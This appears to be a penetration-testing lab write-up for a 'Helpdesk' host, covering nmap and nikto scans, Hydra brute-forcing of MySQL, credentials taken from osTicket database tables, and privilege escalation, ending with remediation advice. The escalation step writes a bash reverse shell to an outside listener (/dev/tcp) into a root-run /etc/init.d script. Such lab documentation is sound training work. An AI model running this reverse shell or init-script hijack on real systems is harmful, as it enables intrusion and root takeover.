# Pentest 14 - Helpdesk - 11 - 10.14.1.11

## Scanning and Enumerating

### Nmap
```bash
# Nmap 7.94 scan initiated Sun Aug  6 15:44:09 2023 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/kali/reports/14-helpdesk/results/10.14.1.11/scans/_quick_tcp_nmap.txt -oX /home/kali/reports/14-helpdesk/results/10.14.1.11/scans/xml/_quick_tcp_nmap.xml 10.14.1.11
Nmap scan report for 10.14.1.11
Host is up, received user-set (0.18s latency).
Scanned at 2023-08-06 15:44:09 EDT for 22s
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.4.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:67:8a:ee:2b:20:1f:c2:7c:40:4a:af:0e:78:a3:f1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC92lOytvOijdKGWgz3dQ7MwGzawyL0r9xvXstYxLdwFwuM7Rgh9thaLGc8lgp14SygOayjzj19RYCz72PtUVzGMJQ3H4ZtpyJrsjxu7hzHnYD6heqQwgi1c0EpCdGdnRj+15Ljvo0WqHikeIvPsZ5YA9sIpIDB+D96OTqaB7tXPmA3s9+DUg5HK1cO+ZuErFLkCPGcwcP42pbDSghikZzuHZuF8IIyCVtg6ReUOrg57cRBIwfXtPkA/JrgSoSfGOX6klt2JHB/PYa54Qs3uf5O2wy31UqURg3MvlOho+Wk1d7mgKg13LpQk9BUfaKbkgLHC1sRI+UVm84eKKPrOhgb
|   256 d3:92:02:90:59:6b:ee:05:f4:6e:38:dd:4f:a7:35:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFLn8+9sYeWEV64JF1QYfk48YyfdlwUVgsIglwOf0qEO6lY6CT5Ej0JDnkJngfjREfg7ixU6F9EGk+lHW5GXzIw=
|   256 97:62:5f:74:d9:20:39:f1:bd:9d:2b:56:cf:0e:45:2d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILZJGeRY+OMw5dSkDMTRseHF2v4HgUxFBTIa5mP8iJHX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/7.4.29)
|_http-favicon: Unknown favicon MD5: D84666B7F0C1CEF1E20892E33308C913
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Helpdesk
111/tcp  open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3306/tcp open  mysql   syn-ack ttl 63 MySQL 5.6.51
| mysql-info: 
|   Protocol: 10
|   Version: 5.6.51
|   Thread ID: 426
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, Support41Auth, SupportsCompression, SupportsLoadDataLocal, FoundRows, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, Speaks41ProtocolOld, LongPassword, LongColumnFlag, InteractiveClient, DontAllowDatabaseTableColumn, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: p?'FhZl/EL.@87LVL[bZ
|_  Auth Plugin Name: mysql_native_password
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/6%OT=21%CT=1%CU=41496%PV=Y%DS=2%DC=I%G=Y%TM=64CFF81F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%TS=A)OPS(O1=M5B4ST1
OS:1NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B
OS:4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T
OS:=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T
OS:2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N
OS:)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
OS:IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.017 days (since Sun Aug  6 15:19:27 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

TRACEROUTE
HOP RTT       ADDRESS
1   184.85 ms 10.14.1.11

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  6 15:44:31 2023 -- 1 IP address (1 host up) scanned in 21.90 seconds
     
```

OS Type: `Linux 4.4`

| Port | Service | Protocol | Version |
| -----| ------- | -------- | ------- |
| 21   | FTP | TCP | vsftpd 3.0.2 |
| 22  | SSH | TCP | OpenSSH 7.4 (protocol 2.0) |
| 80   | HTTP | TCP | Apache httpd 2.4.6 ((CentOS) PHP/7.4.29) |
| 111   | rpcbind | TCP/UDP | RPC #100000 |
| 3306   | mysql | TCP |5.6.51 |
| 8080   | HTTP | TCP | Apache httpd 2.4.6 ((CentOS) PHP/7.4.30) |


Interesting findings:
|   Status: Autocommit
|   Salt: p?'FhZl/EL.@87LVL[bZ
|_  Auth Plugin Name: mysql_native_password




### Nikto
```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.14.1.11
+ Target Hostname:    10.14.1.11
+ Target Port:        80
+ Start Time:         2023-08-06 15:44:32 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/7.4.29
+ /: Retrieved x-powered-by header: PHP/7.4.29.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/7.4.29 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /web.config: ASP config file is accessible.
+ /apps/: Directory indexing found.
+ /apps/: This might be interesting.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /icons/: Directory indexing found.
+ /images/: Directory indexing found.
+ /LICENSE.txt: License file found may identify site software.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
+ /README.md: Readme Found.
+ 8478 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2023-08-06 16:12:52 (GMT-4) (1700 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
## Exploitation

### Initial Access

Scanning revealed `mysql` running which had a salt and an a mysql auth login, so I started there.
The hints suggest brute forcing here as well, so I thought perhaps this would be hydra.
Hydra finds the mysql root password in short order to be:
| User | Pass |
| ---- | ---- | 
| root | whatever | 

![image1](/VHL/Reports/014/images/14_1.png)  
![image2](/VHL/Reports/014/images/14_2.png)  
I started here by connecting to mysql, and enumerating the databases.
There was an `osticket` database, which was conveniently the database for the web application.
I begin connecting with the credentials I found, and start enumerating.

I didn't find interesting things in many of them, but the few I did find valuable were:  
- `ost_user_email` - gave me `support@osticket.com` and `helpdesk@localhost.com`
- `ost_user_account` gave me a `NULL` username,  but a hash for a password. With only two users...
- `ost_syslog` shows some web paths that were not available in Nikto, because they seem to be behind or on a separate network path.

![image3](/VHL/Reports/014/images/14_3.png)
![image4](/VHL/Reports/014/images/14_4.png)
![image5](/VHL/Reports/014/images/14_5.png)
![image6](/VHL/Reports/014/images/14_6.png)
![image7](/VHL/Reports/014/images/14_7.png)

I tried cracking this hash that I found, but I wasn't having much success, so I assumed maybe this was't it?  
![image8](/VHL/Reports/014/images/14_8.png)

I went back to the tables, and checked more tables - `ost_thread_entry` had this bit:  
![image9](/VHL/Reports/014/images/14_9.png)
| User | Pass |
| ---- | ---- | 
| helpdesk | helpdesk90621 | 

SCP is a secure copy protocol, which is commonly used from an ssh shell...

![image10](/VHL/Reports/014/images/14_10.png)



### Privilege Escalation

I start by copying linpeas.sh over to the system to review escalation vectors.
![image11](/VHL/Reports/014/images/14_11.png)

I find two things in particular; one is home $PATH abuse, which I don't know what to do with at the moment, so I want to go back and review.
The other, is that I have raw write permissions in `/etc/init.d/` ?
![image14](/VHL/Reports/014/images/14_12.png)
![image13](/VHL/Reports/014/images/14_13.png)

Checking out this init file, it looks to be a simple service stop/start/help.
![image14](/VHL/Reports/014/images/14_14.png)

Just to be safe, I create a backup (`cp -p /etc/init.d/help ~/`).
Then, since the file is owned by root, and I have write permissions, I rewrite the init.d file to a simple `bash tcp shell`:
`bash -i >& /dev/tcp/172.16.4.1/12345 0>&1`  
![image15](/VHL/Reports/014/images/14_15.png)  
![image16](/VHL/Reports/014/images/14_16.png)  

Success!
## Identified Vulnerabilities

- [CVE]()


## Remediation

The main factor(s) leading to initial access included:  
- Externally Accessible MySQL instance
- Insecure Password
- External SSH authentication with a password

The main factor(s) leading to privilege escalation here were:  
- Write Permissions to `/etc/init.d` which is owned and ran by root.

Remediation steps then include:
- Limiting / removing external access from the MySQL instance through firewalld / iptables. It should only be available via localhost.
- If external / remote access is required, then substantially increasing the password complexity to prevent simple brute force password attacks.
- Reviewing / sanitizing install / default entries in the database to prevent potential abuse of credentials. Data Loss Prevention could be useful here.
- Establishing SSH keys, from authorized users / locations, to prevent arbitrary SSH access from other networks (like with `helpdesk@localhost`).
- Removing write permissions on `/etc/init.d/` - these are files / scripts ran to stop/start services, typically at startup / shutdown, and should generally only be possible by root.


### Resources

- https://github.com/frizb/Hydra-Cheatsheet
- https://haxez.org/wp-content/uploads/2022/06/HaXeZ_Hydra_Cheat_Sheet-1.pdf
- https://www.stationx.net/how-to-use-hydra/
- https://thexssrat.medium.com/using-sqlmap-authenticated-41a28b8f7d5e
- https://gist.github.com/hackhunt/045ac00394d58911e4846b8dba86d5d0

